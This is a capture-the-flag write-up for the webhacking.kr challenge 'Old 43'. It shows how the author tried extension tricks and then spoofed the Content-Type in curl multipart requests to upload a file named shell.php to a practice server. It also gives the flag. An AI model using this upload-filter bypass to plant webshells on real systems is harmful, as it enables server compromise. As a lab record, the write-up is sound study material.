# Old 43    No Brainer Webshell

URL: [http://webhacking.kr:10004](http://webhacking.kr:10004)

![old-43.png](/assets/ctf/webhacking.kr/old-43.png)

For first upload I uploaded a PNG image and it was a success, then I tried `php`, `php5`, `png%00.php` extensions but still got `wrong type`. After some tinkering I inspected the request itself:
```bash
curl 'http://webhacking.kr:10004/index.php' \
  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynWTWEfEA2qciAE2z' \
  -H 'Cookie: PHPSESSID=fqn9tv8tbam8b4gi2edk8vc8bu' \
  -d $'------WebKitFormBoundarynWTWEfEA2qciAE2z\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundarynWTWEfEA2qciAE2z--\r\n'
```

There's 1 more thing we can change: `Content-Type` -> `Content-Type: image/png`

```bash
└─$ curl 'http://webhacking.kr:10004/index.php' \
  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynWTWEfEA2qciAE2z' \
  -H 'Cookie: PHPSESSID=fqn9tv8tbam8b4gi2edk8vc8bu' \
  -d $'------WebKitFormBoundarynWTWEfEA2qciAE2z\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\nContent-Type: image/png\r\n\r\n\r\n------WebKitFormBoundarynWTWEfEA2qciAE2z--\r\n'
<html>
<head>
<title>Challenge 43</title>
</head>
<body>
<hr>
You must upload webshell and cat <b>/flag</b>
<hr>
Done!<br><br><a href=./upload/shell.php>./upload/shell.php</a><form method=post enctype="multipart/form-data" action=index.php>
<input name=file type=file><input type=submit>
</form>
</body>
</html>
```

Hmm... The php script was empty when trying to execute the commands!

I decided to investigate with Burp and when I uploaded the file it was a success without changing the headers...

![old-43-1.png](/assets/ctf/webhacking.kr/old-43-1.png)

![old-43-2.png](/assets/ctf/webhacking.kr/old-43-2.png)

```d
FLAG{V2hhdCBkaWQgeW91IGV4cGVjdD8=}
```

---

I expected a little more lol